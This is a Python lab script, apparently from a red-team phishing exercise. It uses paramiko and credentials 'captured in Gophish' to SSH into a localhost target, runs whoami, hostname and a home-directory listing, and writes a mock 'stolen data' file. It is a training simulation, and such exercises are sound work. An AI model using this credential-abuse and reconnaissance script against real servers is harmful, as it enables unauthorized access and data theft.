#!/usr/bin/env python3
"""
Post-Exploitation: Lateral Movement Simulation
Uses stolen credentials from the phishing campaign to SSH into a target server.
"""
import paramiko
import time
import sys

# --------------------------------------------
# CONFIGURATION (The stolen credentials)
# --------------------------------------------
# Hardcode the credentials you captured in Gophish for the demo.
# In a real Red Team, this would read from a CSV or database.
STOLEN_USERNAME = "victim_user"   # Change this to your test user
STOLEN_PASSWORD = "victim"   # Change this to the password you used in Gophish

TARGET_IP = "127.0.0.1"  # Our Ubuntu VM is the target
SSH_PORT = 22

def ssh_attack(username, password, host, port=22):
    """
    Attempts to SSH into the target using stolen creds.
    If successful, executes a few reconnaissance commands.
    """
    print(f"[*] Attempting lateral movement to {host}:{port} with {username}...")
    time.sleep(1)
    
    client = paramiko.SSHClient()
    # For lab only: automatically accept the host key
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        # --- The ACTUAL authentication ---
        client.connect(host, port=port, username=username, password=password, timeout=5)
        print(f"[+] SUCCESS! Logged in as {username} on {host}")
        
        # --- Post-authentication actions (attacker commands) ---
        print("\n[*] Executing reconnaissance commands...")
        
        # 1. Who are we?
        stdin, stdout, stderr = client.exec_command("whoami")
        print(f"[+] Current User: {stdout.read().decode().strip()}")
        
        # 2. What's the hostname?
        stdin, stdout, stderr = client.exec_command("hostname")
        print(f"[+] Hostname: {stdout.read().decode().strip()}")
        
        # 3. Check for sensitive files (simulate data exfiltration)
        stdin, stdout, stderr = client.exec_command("ls -la /home/victim_user/")
        print("\n[+] Directory listing of /home/victim_user/:")
        print(stdout.read().decode())
        
        # 4. Simulate downloading a fake "payroll.xlsx" file (touch a file)
        stdin, stdout, stderr = client.exec_command("touch /home/victim_user/stolen_data.txt && echo 'HACKED - Exfil' > /home/victim_user/stolen_data.txt")
        print("[+] Created a mock exfiltrated file: /home/victim_user/stolen_data.txt")
        
        print("\n[!] Lateral movement simulation complete. The attacker has compromised this server.")
        
    except paramiko.AuthenticationException:
        print(f"[-] AUTH FAILED! Incorrect credentials for {username}.")
        print("   (Make sure the password matches the one you set in 'passwd victim_user')")
    except paramiko.SSHException as e:
        print(f"[-] SSH Error: {e}")
        print("   (Is the SSH service running? Check: sudo systemctl status ssh)")
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
    finally:
        client.close()
        print("\n[*] Connection closed.")

if __name__ == "__main__":
    print("""
    =====================================
    POST-EXPLOITATION KILL CHAIN PHASE
    =====================================
    """)
    ssh_attack(STOLEN_USERNAME, STOLEN_PASSWORD, TARGET_IP, SSH_PORT)
